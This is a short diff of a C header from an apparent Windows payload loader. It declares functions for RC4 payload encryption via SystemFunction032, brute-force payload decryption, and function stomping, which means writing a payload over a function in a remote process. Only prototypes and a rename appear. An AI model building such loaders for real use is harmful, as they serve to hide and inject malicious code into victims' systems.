@@ -33,7 +33,7 @@ typedef NTSTATUS(NTAPI* fnSystemFunction032)(
 	struct USTRING* Key
 );
 BYTE BruteDecryption(IN BYTE bFirstByte, IN PBYTE pEncrypted, IN SIZE_T sEncrypted, OUT PBYTE* pDecrypted);
-BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize);
+BOOL RC4Encrypt(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize);
 
 // Stomper
 PVOID StompRemoteFunction(IN HANDLE hProcess, IN LPCWSTR sStompModule, IN LPCSTR sStompFunction, IN PVOID pPayload, IN SIZE_T sPayloadSize);
